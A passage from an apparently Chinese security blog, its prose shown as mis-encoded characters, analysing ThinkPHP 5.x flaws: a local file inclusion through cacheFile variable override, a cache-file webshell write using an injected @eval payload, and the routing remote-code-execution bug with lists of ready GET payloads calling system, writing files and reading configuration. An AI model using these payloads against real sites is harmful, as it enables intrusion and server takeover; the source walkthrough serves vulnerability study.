ã€5.1.0&lt;=ThinkPHP&lt;=5.1.10</p><p>ä½¿ç”¨<code>?cacheFile=1.jpg</code>(jpgä¸ºå¯¹åº”å›¾ç‰‡é©¬)è§¦å‘lfi.</p><p>é¦–å…ˆè¾“å…¥ç”±<code>assign()</code>å‡½æ•°å¤„ç†ã€‚æˆ‘ä»¬ä¸€è·¯è·Ÿåˆ°Viewç±»çš„<code>assign()</code>å‡½æ•°ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">assign</span><span class="params">($name, $value = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_array($name)) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = array_merge(<span class="keyword">$this</span>-&gt;data, $name);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data[$name] = $value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>çœ‹åˆ°æˆ‘ä»¬ä¼ å…¥çš„æ•°æ®ç›´æ¥ä¿å­˜åˆ°viewçš„<code>$this-&gt;data</code><br>æ¥ä¸‹æ¥è°ƒç”¨<code>fetch</code>.æˆ‘ä»¬åŒæ ·ä¸€è·¯è·Ÿåˆ°Viewç±»çš„<code>fetch</code>ä¸­ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">fetch</span><span class="params">($template = <span class="string">''</span>, $vars = [], $replace = [], $config = [], $renderContent = false)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// æ¨¡æ¿å˜é‡</span></span><br><span class="line">    $vars = array_merge(<span class="keyword">self</span>::$var, <span class="keyword">$this</span>-&gt;data, $vars);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// é¡µé¢ç¼“å­˜</span></span><br><span class="line">    ob_start();</span><br><span class="line">    ob_implicit_flush(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ¸²æŸ“è¾“å‡º</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        $method = $renderContent ? <span class="string">'display'</span> : <span class="string">'fetch'</span>;</span><br><span class="line">        <span class="comment">// å…è®¸ç”¨æˆ·è‡ªå®šä¹‰æ¨¡æ¿çš„å­—ç¬¦ä¸²æ›¿æ¢</span></span><br><span class="line">        $replace = array_merge(<span class="keyword">$this</span>-&gt;replace, $replace, (<span class="keyword">array</span>) <span class="keyword">$this</span>-&gt;engine-&gt;config(<span class="string">'tpl_replace_string'</span>));</span><br><span class="line">        <span class="keyword">$this</span>-&gt;engine-&gt;config(<span class="string">'tpl_replace_string'</span>, $replace);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;engine-&gt;$method($template, $vars, $config);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (\<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">        ob_end_clean();</span><br><span class="line">        <span class="keyword">throw</span> $e;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è·å–å¹¶æ¸…ç©ºç¼“å­˜</span></span><br><span class="line">    $content = ob_get_clean();</span><br><span class="line">    <span class="comment">// å†…å®¹è¿‡æ»¤æ ‡ç­¾</span></span><br><span class="line">    Hook::listen(<span class="string">'view_filter'</span>, $content);</span><br><span class="line">    <span class="keyword">return</span> $content;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¾ˆå¿«ä¼šå‘ç°å®é™…è°ƒç”¨çš„æ˜¯<code>$this-&gt;engine-&gt;$method($template, $vars, $config);</code>.è€Œ<code>$method</code>æ­¤å¤„ä¸º<code>fetch</code>,<code>$vars</code>ä¸ºæˆ‘ä»¬å¯æ§çš„ä¼ å…¥å˜é‡ã€‚æ¥ä¸‹æ¥ç”±æ¨¡æ¿å¼•æ“å¤„ç†æˆ‘ä»¬çš„å˜é‡</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">fetch</span><span class="params">($template, $data = [], $config = [])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">''</span> == pathinfo($template, PATHINFO_EXTENSION)) &#123;</span><br><span class="line">        <span class="comment">// è·å–æ¨¡æ¿æ–‡ä»¶å</span></span><br><span class="line">        $template = <span class="keyword">$this</span>-&gt;parseTemplate($template);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// æ¨¡æ¿ä¸å­˜åœ¨ æŠ›å‡ºå¼‚å¸¸</span></span><br><span class="line">    <span class="keyword">if</span> (!is_file($template)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> TemplateNotFoundException(<span class="string">'template not exists:'</span> . $template, $template);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// è®°å½•è§†å›¾ä¿¡æ¯</span></span><br><span class="line">    App::$debug &amp;&amp; Log::record(<span class="string">'[ VIEW ] '</span> . $template . <span class="string">' [ '</span> . var_export(array_keys($data), <span class="keyword">true</span>) . <span class="string">' ]'</span>, <span class="string">'info'</span>);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;template-&gt;fetch($template, $data, $config);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ³¨æ„åˆ°å¦‚æœ<code>$template</code>å¯¹åº”çš„è·¯å¾„æ–‡ä»¶ä¸å­˜åœ¨çš„è¯ç›´æ¥æŠ¥é”™äº†ã€‚æ‰€ä»¥è¿™ä¸ªlfiæ´çš„å‰æè¿˜å¾—éœ€è¦æˆ‘ä»¬ç¯å¢ƒä»£ç ä¸­å­˜åœ¨<code>å½“å‰æ¨¡å—/é»˜è®¤è§†å›¾ç›®å½•/å½“å‰æ§åˆ¶å™¨ï¼ˆå°å†™ï¼‰/å½“å‰æ“ä½œï¼ˆå°å†™ï¼‰.html</code>ã€‚<br>å¦‚æœè¿™é‡Œæ²¡æŠ¥é”™å³è¿›å…¥templateçš„<code>fetch</code>.<br><img src="/2020/08/05/Thinkphp-vuln/12.PNG" class="lazyload" data-srcset="12.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>çœ‹åˆ°<code>$vars</code>è¢«èµ‹ç»™data.è€Œé©¬ä¸Šä¸‹é¢storageè°ƒç”¨äº†readå‡½æ•°ã€‚é‡Œé¢å­˜åœ¨<code>extract</code>è¿™æ ·çš„å˜é‡è¦†ç›–ä»£ç ã€‚å¹¶ä¸”ç›´æ¥<code>include</code>cacheFileã€‚</p><p>ä¹Ÿå°±æ˜¯è¯´,<code>$cacheFile</code>å¯ä»¥è¢«å˜é‡è¦†ç›–ã€‚è¾¾æˆlfiã€‚</p><p>å®˜æ–¹çš„ä¿®å¤æ–¹æ³•æ˜¯é€šè¿‡å°†<code>$cacheFile</code> å˜é‡å­˜å‚¨åœ¨ <code>$this-&gt;cacheFile</code> ä¸­.é˜²æ­¢å˜é‡è¦†ç›–ã€‚</p><h2 id="tp5-0-rce"><a href="#tp5-0-rce" class="headerlink" title="tp5.0-rce"></a>tp5.0-rce</h2><p>Index.phpé…ç½®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Cache</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Cache::set(<span class="string">"name"</span>,input(<span class="string">"get.username"</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'Cache success'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;tpdemo&#x2F;public&#x2F;?username&#x3D;byc_404%0d%0a@eval($_GET[_]);&#x2F;&#x2F;</span><br></pre></td></tr></table></figure><p>ä¸Šé¢çš„payloadå°†æŠŠä¸€å¥è¯webshellå†™å…¥ç¼“å­˜æ–‡ä»¶ã€‚è®¿é—®å¯¹åº”è·¯å¾„å³å¯ã€‚<br><img src="/2020/08/05/Thinkphp-vuln/13.PNG" class="lazyload" data-srcset="13.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>è¿™ä¸ªç”¨ä¾‹å…¶å®è·Ÿä»¥å‰ichunqiuå¹³å°ä¸Šä¸€é“thinkphpäºŒæ¬¡å¼€å‘çš„æ¨¡æ¿ç¼“å­˜æ–‡ä»¶getshellå¾ˆç›¸ä¼¼ã€‚è¿™é‡Œæ¥è·Ÿè¿›ä¸‹æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">set</span><span class="params">($name, $value, $expire = null)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">self</span>::$writeTimes++;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">self</span>::init()-&gt;set($name, $value, $expire);</span><br><span class="line">&#125;</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">init</span><span class="params">(array $options = [])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_null(<span class="keyword">self</span>::$handler)) &#123;</span><br><span class="line">        <span class="comment">// è‡ªåŠ¨åˆå§‹åŒ–ç¼“å­˜</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>($options)) &#123;</span><br><span class="line">            $connect = <span class="keyword">self</span>::connect($options);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="string">'complex'</span> == Config::get(<span class="string">'cache.type'</span>)) &#123;</span><br><span class="line">            $connect = <span class="keyword">self</span>::connect(Config::get(<span class="string">'cache.default'</span>));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $connect = <span class="keyword">self</span>::connect(Config::get(<span class="string">'cache'</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">self</span>::$handler = $connect;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">self</span>::$handler;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œinit()å‡½æ•°ä¸»è¦æ˜¯å®ä¾‹åŒ–äº†ä¸€ä¸ª<code>handler</code>å¯¹è±¡ã€‚æ­¤å¤„ä¸ºé»˜è®¤å€¼Fileç±»ã€‚é‚£ä¹ˆå‰å¾€cache/driver/Fileç±»çœ‹ä¸‹.<br>æ­¤å¤„Fileç±»çš„setæ–¹æ³•å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">set</span><span class="params">($name, $value, $expire = null)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_null($expire)) &#123;</span><br><span class="line">        $expire = <span class="keyword">$this</span>-&gt;options[<span class="string">'expire'</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    $filename = <span class="keyword">$this</span>-&gt;getCacheKey($name);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;tag &amp;&amp; !is_file($filename)) &#123;</span><br><span class="line">        $first = <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $data = serialize($value);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;options[<span class="string">'data_compress'</span>] &amp;&amp; function_exists(<span class="string">'gzcompress'</span>)) &#123;</span><br><span class="line">        <span class="comment">//æ•°æ®å‹ç¼©</span></span><br><span class="line">        $data = gzcompress($data, <span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $data   = <span class="string">"&lt;?php\n//"</span> . sprintf(<span class="string">'%012d'</span>, $expire) . $data . <span class="string">"\n?&gt;"</span>;</span><br><span class="line">    $result = file_put_contents($filename, $data);</span><br><span class="line">    <span class="keyword">if</span> ($result) &#123;</span><br><span class="line">        <span class="keyword">isset</span>($first) &amp;&amp; <span class="keyword">$this</span>-&gt;setTagItem($filename);</span><br><span class="line">        clearstatcache();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ã€‚æ•°æ®<code>$value</code>ç»ç”±åºåˆ—åŒ–åè¢«æ‹¼æ¥åˆ°å«æœ‰phpä»£ç å—çš„è¯­å¥ä¸­ã€‚ä¹‹åæ‰§è¡Œ<code>file_put_contents</code>.ç¬¦åˆæˆ‘ä»¬å†™å…¥shellçš„ç”¨æ³•ã€‚<br>å› æ­¤åªéœ€æ³¨æ„ä½¿ç”¨æ¢è¡Œç¬¦bypasså‰é¢çš„æ³¨é‡Šç¬¦å³å¯ã€‚</p><p>å½“ç„¶è¿™ä¸ªå†™shell rceçš„æ–¹æ³•æ¯”è¾ƒå°´å°¬ã€‚å› ä¸ºæ–‡ä»¶åå¯ä»¥çœ‹åˆ°ç”±<code>getCacheKey</code>å†³å®šã€‚å…¶æ–‡ä»¶åç”Ÿæˆæ–¹å¼å¦‚ä¸‹ï¼šå…ˆè®¡ç®—é”®åmd5å€¼ã€‚å†å–å‰ä¸¤ä½ä¸ºç›®å½•ã€‚å30ä½ä¸ºæ–‡ä»¶åã€‚æˆ‘ä»¬è¿™é‡Œæ˜¯å› ä¸ºæå‰è®¾å®šå¥½äº†Index.phpä¸­é”®åä¸º<code>name</code>.æ‰€ä»¥å¯ä»¥è®¡ç®—æ–‡ä»¶å<code>b0/68931cc450442b63f5b3d276ea4297.php</code>ã€‚ä½†æ˜¯å®é™…ä¸­å¦‚æœæ²¡æœ‰æºç æ³„éœ²æ— æ³•å¾—çŸ¥é”®åã€‚ä¹Ÿå°±æ²¡æ³•è®¡ç®—shellçš„è·¯å¾„ã€‚</p><p>å½“ç„¶ã€‚åœ¨ååºåˆ—åŒ–popé“¾ä¸­æˆ‘ä»¬åˆ©ç”¨è¿™ä¸ªFileç±»å…³äºæ–‡ä»¶åå¯æ§çš„é—®é¢˜å°±å¤§ä¸ä¸€æ ·äº†ã€‚å…·ä½“åé¢å†è¯´ã€‚</p><h2 id="tp5-rce-get"><a href="#tp5-rce-get" class="headerlink" title="tp5.*-rce-get"></a>tp5.*-rce-get</h2><p>æ¯”è¾ƒå‡ºåçš„rceæ´ã€‚å½±å“ç‰ˆæœ¬5.0.7&lt;=ThinkPHP5&lt;=5.0.22 ã€5.1.0&lt;=ThinkPHP&lt;=5.1.30ã€‚<br>5.1.xç‰ˆæœ¬çš„payloadæœ‰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?s&#x3D;index&#x2F;\think\Request&#x2F;input&amp;filter[]&#x3D;system&amp;data&#x3D;pwd</span><br><span class="line">?s&#x3D;index&#x2F;\think\view\driver\Php&#x2F;display&amp;content&#x3D;&lt;?php phpinfo();?&gt;</span><br><span class="line">?s&#x3D;index&#x2F;\think\template\driver\file&#x2F;write&amp;cacheFile&#x3D;shell.php&amp;content&#x3D;&lt;?php phpinfo();?&gt;</span><br><span class="line">?s&#x3D;index&#x2F;\think\Container&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id</span><br><span class="line">?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id</span><br></pre></td></tr></table></figure><p>5.0.*</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?s&#x3D;index&#x2F;think\config&#x2F;get&amp;name&#x3D;database.username # è·å–é…ç½®ä¿¡æ¯</span><br><span class="line">?s&#x3D;index&#x2F;\think\Lang&#x2F;load&amp;file&#x3D;..&#x2F;..&#x2F;test.jpg    # åŒ…å«ä»»æ„æ–‡ä»¶</span><br><span class="line">?s&#x3D;index&#x2F;\think\Config&#x2F;load&amp;file&#x3D;..&#x2F;..&#x2F;t.php     # åŒ…å«ä»»æ„.phpæ–‡ä»¶</span><br><span class="line">?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id</span><br></pre></td></tr></table></figure><p>é¦–å…ˆèµ·å› å¯ä»¥ä»config/app.phpä¸­çœ‹åˆ°ã€‚é»˜è®¤æƒ…å†µä¸‹<code>var_pathinfo</code>ä¸ºs.<code>url_route_must</code>ä¸ºfalse<br><img src="/2020/08/05/Thinkphp-vuln/14.PNG" class="lazyload" data-srcset="14.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æ˜¾ç„¶æ­¤æ—¶æˆ‘ä»¬å¯ä»¥ä»»æ„è°ƒç”¨æ§åˆ¶å™¨ã€‚thinkphpä¸­çš„æµç¨‹æ˜¯<code>http://site/?s=æ¨¡å—/æ§åˆ¶å™¨/æ–¹æ³•</code></p><p>åœ¨é‡è¦ä»£ç controllerå¤„ä¸‹æ–­ç‚¹ï¼ˆæ­¤å¤„ä¹Ÿæ˜¯5.1.30åé«˜ç‰ˆæœ¬å®˜æ–¹ä¿®æ”¹çš„éƒ¨åˆ†ã€‚è¯´æ˜åŸä»£ç å­˜åœ¨é—®é¢˜ï¼‰<br><img src="/2020/08/05/Thinkphp-vuln/15.PNG" class="lazyload" data-srcset="15.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?s&#x3D;index&#x2F;\think\Request&#x2F;input&amp;filter[]&#x3D;system&amp;data&#x3D;whoami</span><br></pre></td></tr></table></figure><p>è‡ªåŠ¨è·Ÿéšdebugè°ƒç”¨å‡½æ•°è·Ÿè¿›ã€‚å¼€å§‹åœ¨controllerè¿™å¯ä»¥çœ‹è§<code>$result</code>å˜é‡æ˜¯å­˜å‚¨äº†æˆ‘ä»¬ä¼ å…¥çš„å€¼çš„æ•°ç»„ã€‚å…¶å€¼åˆ†åˆ«ä¸º<code>index</code>,<code>\think\Request</code>,<code>input</code>.<br>ä¸€è·¯è·Ÿä¸‹å»ä¼šå‘ç°æ‰§è¡Œä»£ç çš„å…³é”®ä½ç½®åœ¨<br>thinkphp\library\think\route\dispatch\Module.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">exec</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// ç›‘å¬module_init</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;app[<span class="string">'hook'</span>]-&gt;listen(<span class="string">'module_init'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// å®ä¾‹åŒ–æ§åˆ¶å™¨</span></span><br><span class="line">        $instance = <span class="keyword">$this</span>-&gt;app-&gt;controller(<span class="keyword">$this</span>-&gt;controller,</span><br><span class="line">            <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">'url_controller_layer'</span>),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">'controller_suffix'</span>),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">'empty_controller'</span>));</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException $e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> HttpException(<span class="number">404</span>, <span class="string">'controller not exists:'</span> . $e-&gt;getClass());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;app[<span class="string">'middleware'</span>]-&gt;controller(<span class="function"><span class="keyword">function</span> <span class="params">(Request $request, $next)</span> <span class="title">use</span> <span class="params">($instance)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// è·å–å½“å‰æ“ä½œå</span></span><br><span class="line">        $action = <span class="keyword">$this</span>-&gt;actionName . <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">'action_suffix'</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (is_callable([$instance, $action])) &#123;</span><br><span class="line">            <span class="comment">// æ‰§è¡Œæ“ä½œæ–¹æ³•</span></span><br><span class="line">            $call = [$instance, $action];</span><br><span class="line"></span><br><span class="line">            <span class="comment">// ä¸¥æ ¼è·å–å½“å‰æ“ä½œæ–¹æ³•å</span></span><br><span class="line">            $reflect    = <span class="keyword">new</span> ReflectionMethod($instance, $action);</span><br><span class="line">            $methodName = $reflect-&gt;getName();</span><br><span class="line">            $suffix     = <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">'action_suffix'</span>);</span><br><span class="line">            $actionName = $suffix ? substr($methodName, <span class="number">0</span>, -strlen($suffix)) : $methodName;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;request-&gt;setAction($actionName);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// è‡ªåŠ¨è·å–è¯·æ±‚å˜é‡</span></span><br><span class="line">            $vars = <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">'url_param_type'</span>)</span><br><span class="line">            ? <span class="keyword">$this</span>-&gt;request-&gt;route()</span><br><span class="line">            : <span class="keyword">$this</span>-&gt;request-&gt;param();</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (is_callable([$instance, <span class="string">'_empty'</span>])) &#123;</span><br><span class="line">            <span class="comment">// ç©ºæ“ä½œ</span></span><br><span class="line">            $call    = [$instance, <span class="string">'_empty'</span>];</span><br><span class="line">            $vars    = [<span class="keyword">$this</span>-&gt;actionName];</span><br><span class="line">            $reflect = <span class="keyword">new</span> ReflectionMethod($instance, <span class="string">'_empty'</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// æ“ä½œä¸å­˜åœ¨</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> HttpException(<span class="number">404</span>, <span class="string">'method not exists:'</span> . get_class($instance) . <span class="string">'-&gt;'</span> . $action . <span class="string">'()'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;app[<span class="string">'hook'</span>]-&gt;listen(<span class="string">'action_begin'</span>, $call);</span><br><span class="line"></span><br><span class="line">        $data = <span class="keyword">$this</span>-&gt;app-&gt;invokeReflectMethod($instance, $reflect, $vars);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;autoResponse($data);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;app[<span class="string">'middleware'</span>]-&gt;dispatch(<span class="keyword">$this</span>-&gt;request, <span class="string">'controller'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä»”ç»†ä¸€çœ‹å…¶å®å°±æ˜¯è°ƒç”¨äº†åå°„æ–¹æ³•ã€‚ç”¨<code>$this-&gt;controller</code>,<code>$this-&gt;actionName</code>.å› ä¸ºä¹‹å‰æˆ‘ä»¬çŸ¥é“Request 